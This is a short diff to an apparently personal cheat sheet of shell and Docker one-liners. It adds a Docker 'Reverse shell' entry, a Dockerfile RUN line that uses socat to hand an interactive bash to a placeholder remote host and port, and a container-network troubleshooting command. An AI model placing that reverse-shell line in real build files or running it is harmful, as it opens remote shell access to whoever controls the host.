@@ -6,6 +6,14 @@ sudo lsof | awk '{ print $2, $9 }' | sort | uniq -c | sort -n | tail -20
 ```
 
 ## Docker
+#### Reverse shell
+```
+RUN socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host>:<port>
+```
+#### Join container network namespace for troubleshooting
+```
+docker run -it --net container:<has> nicolaka/netshoot
+```
 
 ## Kafka
 #### Print the last 2 messages from a topic
